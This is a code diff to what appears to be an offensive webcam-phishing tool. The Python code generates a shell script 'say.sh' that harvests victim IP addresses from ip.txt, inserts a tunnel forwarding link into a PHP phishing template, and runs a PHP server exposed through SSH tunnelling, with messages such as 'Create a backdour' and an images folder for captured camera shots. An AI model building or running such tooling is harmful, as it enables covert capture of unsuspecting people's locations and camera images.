@@ -18,6 +18,8 @@ def running():
                         print ("")
                         print (blue+"[*]"+default+ "Create a backdour")
                         time.sleep(2)
+                        print (blue+"[*]"+default+ "Images in waf/modules/payloads/web/camera/")
+                        time.sleep(2)
                         print ("")
                         time.sleep(2)
                         print ("")
@@ -25,6 +27,7 @@ def running():
                         f = open("waf/modules/payloads/web/camera/say.sh" , 'w')
                         f.write('''
 rm -rf say.sh
+cd waf/modules/payloads/web/camera/ 
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
@@ -58,7 +61,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 }
 server() {
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Server...\e[0m\n"
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
